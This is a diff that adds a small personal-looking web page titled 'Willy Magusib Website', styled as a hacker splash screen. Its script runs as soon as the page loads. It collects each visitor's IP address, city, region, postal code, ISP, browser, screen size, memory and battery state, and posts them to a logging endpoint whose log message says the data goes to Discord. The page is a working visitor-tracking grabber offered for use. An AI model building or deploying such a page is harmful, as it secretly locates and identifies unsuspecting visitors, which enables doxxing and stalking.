@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Willy Magusib</title>
+  <style>
+    body {
+      background: #0f0f0f;
+      color: #00ff88;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      font-size: 2rem;
+    }
+    p {
+      margin-top: 10px;
+      font-size: 1rem;
+    }
+    img {
+      width: 150px;
+      border-radius: 50%;
+      border: 2px solid #00ff88;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome to Willy Magusib Website</h1>
+  <p>Scanning your device info...</p>
+  <img src="https://i.imgur.com/IepwgGt.jpeg" alt="Hacker Image" />
+
+  <script>
+    async function getInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        const memory = navigator.deviceMemory || 0;
+        const screenSize = `${screen.width}x${screen.height}`;
+        const viewport = `${window.innerWidth}x${window.innerHeight}`;
+        const userAgent = navigator.userAgent;
+        const isMobile = /Mobi|Android/i.test(userAgent);
+
+        const browser = (() => {
+          if (userAgent.includes("Firefox")) return "Firefox";
+          if (userAgent.includes("Edg")) return "Edge";
+          if (userAgent.includes("Chrome")) return "Chrome";
+          if (userAgent.includes("Safari")) return "Safari";
+          return "Unknown";
+        })();
+
+        const geo = await fetch('https://ipapi.co/json').then(res => res.json());
+
+        const payload = {
+          ip: geo.ip,
+          city: geo.city,
+          region: geo.region,
+          country: geo.country_name,
+          isp: geo.org,
+          timezone: geo.timezone,
+          postal: geo.postal,
+          mobile: isMobile,
+          browser: browser,
+          memory: memory,
+          battery: Math.round(battery.level * 100),
+          charging: battery.charging,
+          screen: screenSize,
+          viewport: viewport
+        };
+
+        await fetch('/api/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        console.log("Info sent to Discord.");
+      } catch (err) {
+        console.error("Error sending info:", err);
+      }
+    }
+
+    getInfo();
+  </script>
+</body>
+</html>
